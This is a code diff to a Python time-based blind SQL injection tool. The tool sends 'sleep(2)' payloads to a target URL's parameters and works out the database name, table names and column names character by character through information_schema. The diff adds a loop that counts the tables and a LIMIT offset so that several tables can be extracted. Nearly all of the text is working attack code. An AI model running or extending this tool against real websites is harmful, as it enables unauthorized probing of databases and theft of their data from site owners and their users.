@@ -28,7 +28,7 @@ SLEEP_TIME = 2
 
 ALPHABET = string.ascii_letters + string.digits + " !\"#$&'()*+,-./:;<=>?@[\\]^_`{|}~%"
 
-TABLES_FUZZING = ['password','pass','test','user','a','b']
+TABLES_FUZZING = ['password','user','test','a','b','c']
 
 verif_payload = "select sleep(2)"
 verif_payload_urlencode ="select%20sleep%282%29"
@@ -124,11 +124,20 @@ def attack_one_payload(url, params, payload, verbose=0):
             print_redb('[-] Non effective payload')
         return False
 
-def attack_get_length(url, params, database=True, fuzz="pass"):
+def attack_get_nb(url, params, fuzz="pass"):
+    for i in range(1, 40):
+        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit "+str(i)+",1) like '%'"
+        query = query_template.format(fuzz=fuzz)
+        if not attack_one_payload(url,params, query):
+            return i-1
+    print_redb('[-] Error: Length >20 caracters')
+    return -1
+
+def attack_get_length(url, params, database=True, fuzz="pass", limit=0):
     if database:
         query_template = "select sleep(2) from dual where database() like '{mask}'"
     else:
-        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit 0,1) like '{mask}'"
+        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit "+str(limit)+",1) like '{mask}'"
     for i in range(1, 40):
         mask = '_' * i
         query = query_template.format(fuzz=fuzz,mask=mask)
@@ -137,8 +146,8 @@ def attack_get_length(url, params, database=True, fuzz="pass"):
     print_redb('[-] Error: Length >20 caracters')
     return -1
 
-def attack_get_column_length(url, params, table, fuzz="pass"):
-    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit 0,1) like '" + table + "'"
+def attack_get_column_length(url, params, table, fuzz="pass", limit=0):
+    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit "+str(limit)+",1) like '" + table + "'"
     for i in range(1, 51):
         for j in range(1, 50):
             mask = '_' * i + fuzz + '_' * j
@@ -148,8 +157,8 @@ def attack_get_column_length(url, params, table, fuzz="pass"):
     print_redb('[-] Error: Length >40 caracters')
     return -1
 
-def attack_get_column(url, params, length, table, mask_with_fuzz, column_name="", i=1, verbose=0):
-    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit 0,1) like '" + table + "'"
+def attack_get_column(url, params, length, table, mask_with_fuzz, column_name="", i=1, verbose=0, limit=0):
+    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit "+str(limit)+",1) like '" + table + "'"
     d = "column"
     for char in ALPHABET:
         mask = column_name + char + mask_with_fuzz[i:]
@@ -167,12 +176,12 @@ def attack_get_column(url, params, length, table, mask_with_fuzz, column_name=""
     print_redb('[-] Erreur: Caracter not in alphabet')
     return " "
 
-def attack_get_information(url, params, length, database_name="", database=True, fuzz="pass", verbose=0):
+def attack_get_information(url, params, length, database_name="", database=True, fuzz="pass", verbose=0, limit=0):
     if database:
         query_template = "select sleep(2) from dual where database() like '{mask}'"
         d="database"
     else:
-        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit 0,1) like '{mask}'"
+        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit "+str(limit)+",1) like '{mask}'"
         d="table"
     for char in ALPHABET:
         mask = database_name + char + '_' * (length - 1)
@@ -201,27 +210,34 @@ def attack_main(url, params, verbose=0):
     database_name = attack_get_information(url, params, database_length)
     print_greenb("[+] Database name : " + database_name)
     for fuzz in TABLES_FUZZING:
+        print_blue("[X] Retrieve number of tables with column fuzzing:" + fuzz)
+        nb_tables = attack_get_nb(url,params,fuzz)
+        if database_length != -1:
+            print_greenb("[+] We got " + str(nb_tables) +" number of tables with column fuzzing:" + fuzz)
+        else:
+            return -1
         print_blue("[X] Retrieve tables names")
-        print_blue("[X] Retrieve table name length (Column fuzz:" + fuzz + ")")
-        table_length = attack_get_length(url, params, False, fuzz)
-        if table_length != -1:
-            print_greenb("[+] Table name length : " + str(table_length))
-        else:
-            return -1
-        print_blue("[X] Retrieve table name")
-        table = attack_get_information(url, params, table_length, "",False, fuzz)
-        print_greenb("[+] Table : " + table)
-        print_blue("[X] Retrieve table column for table " + table)
-        print_blue("[X] Retrieve table column length for table " + table)
-        mask, column_length = attack_get_column_length(url, params, table, fuzz)
-        if column_length != -1:
-            print_greenb("[+] Column name length : " + str(column_length))
-            if verbose > 0:
-                print_greenb("[+] Retrieve column name for table "+table+" : Length " + str(column_length) + ", Step retrieve :" + mask)
-        else:
-            return -1
-        column=attack_get_column(url, params, column_length, table, mask)
-        print_greenb("[+] Column in table " + table + " : " + column)
+        for i in range(nb_tables):
+            print_blue("[X] Retrieve table number ["+str(i)+"] name length")
+            table_length = attack_get_length(url, params, False, fuzz, i)
+            if table_length != -1:
+                print_greenb("[+] Table name length : " + str(table_length))
+            else:
+                return -1
+            print_blue("[X] Retrieve table name")
+            table = attack_get_information(url, params, table_length, "",False, fuzz, verbose, i)
+            print_greenb("[+] Table : " + table)
+            print_blue("[X] Retrieve table column for table " + table)
+            print_blue("[X] Retrieve table column length for table " + table)
+            mask, column_length = attack_get_column_length(url, params, table, fuzz, i)
+            if column_length != -1:
+                print_greenb("[+] Column name length : " + str(column_length))
+                if verbose > 0:
+                    print_greenb("[+] Retrieve column name for table "+table+" : Length " + str(column_length) + ", Step retrieve :" + mask)
+            else:
+                return -1
+            column=attack_get_column(url, params, column_length, table, mask, limit=i)
+            print_greenb("[+] Column in table " + table + " : " + column)
         
 
 print(ascii_art)
